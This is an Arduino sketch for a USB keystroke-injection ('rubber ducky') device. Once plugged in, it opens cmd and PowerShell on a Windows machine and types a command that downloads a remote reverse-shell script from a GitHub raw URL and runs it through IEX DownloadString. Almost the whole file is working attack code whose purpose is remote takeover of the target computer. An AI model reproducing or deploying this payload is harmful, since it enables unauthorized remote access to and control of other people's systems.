/* ----------------------- */
/*    tested by rng70      */
/* ----------------------- */

#include "Keyboard.h"

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void esp_print(String text){
  for (int i = 0; i<=text.length(); i++)
  {
      char val = text[i];
      if (val == ':'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print(".");
        Keyboard.releaseAll();
      }else if (val == '/'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print("7");
        Keyboard.releaseAll();
      }else if (val == '('){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("8");
          Keyboard.releaseAll();
      }else if (val == ')'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("9");
          Keyboard.releaseAll();
      }else if (val == '='){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("0");
          Keyboard.releaseAll();
      }else if (val == ';'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print(",");
          Keyboard.releaseAll();
      }else if (val == '"'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("2");
          Keyboard.releaseAll();
      }else if (val == '-'){
          Keyboard.print("/");
      }else if (val == '&'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("6");
          Keyboard.releaseAll();
      }else if (val == '\\'){
          Keyboard.press(KEY_RIGHT_ALT);
          Keyboard.print("`");
          Keyboard.releaseAll();
      }else{
        Keyboard.print(val);
      }
  }
}

void opencmd(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  delay(400);
  typeKey(KEY_RETURN);
}

void reverse(){
  esp_print("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/ricardojoserf/arduino-rubber-ducky-scripts/master/reverseshell/test.ps1\")");
  typeKey(KEY_RETURN);
  delay(100);
}


void openpowershell(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  delay(100);
  typeKey(KEY_RETURN);
}

void setup(){
  // Begining the Keyboard stream
  Keyboard.begin();
  delay(3000);
  opencmd();
  delay(1000);
  openpowershell();
  delay(1000);
  reverse();
  //downloadimage(letter, directory, imagename, url);
  //delay(5000);
  //updatewallpaper(letter, directory, imagename);
  //clean(letter, directory, imagename);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
